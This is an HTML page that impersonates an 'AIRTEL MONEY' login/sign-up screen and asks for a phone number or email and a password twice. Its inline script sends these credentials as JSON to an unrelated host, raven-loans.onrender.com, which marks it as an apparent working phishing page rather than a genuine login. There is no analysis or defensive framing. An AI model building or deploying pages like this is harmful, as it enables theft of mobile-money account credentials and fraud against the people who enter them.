<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>AIRTEL MONEY – Login</title>
    <style>
      * {
        box-sizing: border-box;
        font-family:
          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      }
      body {
        margin: 0;
        background: #692424;
        color: #771818;
      }

      header {
        background: #9c3838;
        padding: 12px 16px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        border-bottom: 1px solid #862020;
      }

      header .logo {
        font-size: 22px;
      }

      header .menu {
        font-size: 24px;
      }

      .hero {
        background: linear-gradient(135deg, #4aa3d8, #9fe0c3);
        padding: 40px 20px 60px;
      }

      .hero h1 {
        color: #eb0f0f;
        text-align: center;
        margin: 0 0 40px;
        letter-spacing: 1px;
      }

      .form-box {
        max-width: 420px;
        margin: 0 auto;
      }

      .form-box h2 {
        text-align: center;
        margin-bottom: 30px;
      }

      label {
        display: block;
        margin-bottom: 6px;
        font-size: 15px;
      }

      input {
        width: 100%;
        padding: 14px;
        border-radius: 6px;
        border: none;
        margin-bottom: 20px;
        font-size: 16px;
      }

      .submit {
        display: flex;
        justify-content: flex-end;
      }

      button {
        background: #7b4b6b;
        color: #fff;
        border: none;
        padding: 12px 26px;
        border-radius: 8px;
        font-size: 16px;
        cursor: pointer;
      }

      .debug {
        margin-top: 20px;
        font-size: 14px;
        opacity: 0.85;
      }

      footer {
        background: #ffffff;
        padding: 24px 16px;
        text-align: center;
        font-size: 14px;
        color: #666;
      }

      footer span {
        color: #6a5acd;
      }
    </style>
  </head>
  <body>
    <header>
      <div class="logo"></div>
      <div class="menu">☰</div>
    </header>

    <div class="hero">
      <h1>AIRTEL MONEY</h1>
      <img
        src="images/AIRTEL.PNG"
        alt="AIRTEL MONEY"
        style="display: block; margin: 0 auto 40px; max-width: 200px"
      />

      <div class="form-box">
        <h2>LOGIN / SIGN UP</h2>

        <label>Email/phone number </label>
        <input type="text" id="identifier" name="identifier" />

        <label>Input password</label>
        <input type="password" id="password" name="password" />

        <label>Confirm password </label>
        <input type="password" id="confirmPassword" name="confirmPassword" />

        <div class="submit">
          <button id="submitBtn" type="button">Submit</button>
        </div>

        <div class="debug" id="debug"></div>
      </div>
    </div>

    <footer>
      Copyright © AIRTEL MONEY<br />
      Powered by <span>trust</span>
    </footer>

    <script>
      document
        .getElementById("submitBtn")
        .addEventListener("click", async () => {
          const debug = document.getElementById("debug");
          const identifier = document.getElementById("identifier").value.trim();
          const password = document.getElementById("password").value;
          const confirmPassword =
            document.getElementById("confirmPassword").value;

          if (!identifier || !password || !confirmPassword) {
            debug.textContent = "Please fill in all fields";
            return;
          }
          if (password !== confirmPassword) {
            debug.textContent = "Passwords do not match";
            return;
          }

          try {
            const res = await fetch("https://raven-loans.onrender.com/submit", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ identifier, password, confirmPassword }),
            });
            const data = await res.json();
            if (data.success) {
              debug.textContent = "Submission sent!";
            } else {
              debug.textContent = "Error sending submission";
            }
          } catch (err) {
            debug.textContent = "Network error";
          }
        });
    </script>
  </body>
</html>
